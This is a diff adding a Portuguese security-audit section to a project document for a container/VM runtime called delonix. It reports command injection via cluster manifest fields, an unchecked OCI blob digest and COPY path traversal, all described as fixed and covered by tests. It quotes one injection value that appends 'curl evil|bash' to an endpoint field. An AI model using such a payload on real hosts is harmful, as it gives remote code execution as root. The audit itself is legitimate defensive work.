@@ -157,6 +157,51 @@ de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.
   comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
   (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.
 
+## Auditoria de segurança (skill `delonix-runtime-sec`)
+
+Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
+`.claude/skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
+containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
+privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).
+
+**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
+holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
+gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
+0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).
+
+**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
+sessão, nunca tinham sido revistos adversarialmente):
+
+1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
+   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
+   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
+   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
+   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
+   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
+   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
+   lição a reter (documentada nos comentários das funções `valid_*`).
+2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
+   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
+   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
+3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
+   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
+   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
+   já usado por `pull_from_registry_with_creds` (que já estava correcto).
+4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
+   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
+   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
+   componente `..`/absoluto fora da base.
+
+**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
+argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
+como os outros métodos do store (`vmimage.rs`).
+
+Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
+test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
+validate_recusa_endpoint_malicioso_no_manifesto_completo`,
+`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
+`cmd::build::tests::safe_join_recusa_dot_dot`.
+
 ## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)
 
 - **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
